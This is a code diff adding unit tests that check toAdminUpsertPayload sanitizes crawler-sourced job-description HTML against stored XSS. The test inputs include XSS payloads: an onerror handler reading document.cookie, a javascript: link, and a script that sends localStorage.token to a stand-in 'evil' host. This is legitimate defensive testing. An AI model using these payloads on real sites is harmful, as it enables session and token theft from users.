@@ -85,3 +85,47 @@ describe("toAdminUpsertPayload — Module 11A company identity fields", () => {
     expect(payload.company_canonical_name).toBe("Freshworks");
   });
 });
+
+// ── A1 stored-XSS fix: crawler-sourced description_html is sanitized at the
+//    ingestion boundary, before it is ever sent to admin_upsert_global_job. ──
+describe("toAdminUpsertPayload — description_html sanitization", () => {
+  it("strips executable markup from crawler HTML (Greenhouse/Ashby feed raw `content`)", () => {
+    const payload = toAdminUpsertPayload(
+      job({
+        descriptionHtml:
+          '<p>Join us.</p><img src=x onerror="alert(document.cookie)">' +
+          '<script>fetch("//evil?"+localStorage.token)</script>' +
+          '<p onclick="x()">Perks</p>',
+      }),
+    );
+    expect(payload.description_html).toBe("<p>Join us.</p><p>Perks</p>");
+    const html = payload.description_html as string;
+    expect(html).not.toMatch(/<\s*script/i);
+    expect(html).not.toMatch(/onerror|onclick/i);
+    expect(html).not.toContain("<img");
+  });
+
+  it("neutralises a javascript: link without dropping the visible text", () => {
+    const payload = toAdminUpsertPayload(
+      job({ descriptionHtml: '<p>Apply <a href="javascript:alert(1)">here</a></p>' }),
+    );
+    expect(payload.description_html).toBe("<p>Apply here</p>");
+  });
+
+  it("keeps legitimate structural formatting intact", () => {
+    const clean =
+      "<h2>About</h2><p>We build <strong>tools</strong>.</p><ul><li>Go</li><li>Rust</li></ul>";
+    const payload = toAdminUpsertPayload(job({ descriptionHtml: clean }));
+    expect(payload.description_html).toBe(clean);
+  });
+
+  it("passes through null when there is no HTML", () => {
+    const payload = toAdminUpsertPayload(job({ descriptionHtml: null }));
+    expect(payload.description_html).toBeNull();
+  });
+
+  it("collapses a payload that is nothing but a script to null (falls back to plain description)", () => {
+    const payload = toAdminUpsertPayload(job({ descriptionHtml: "<script>alert(1)</script>" }));
+    expect(payload.description_html).toBeNull();
+  });
+});
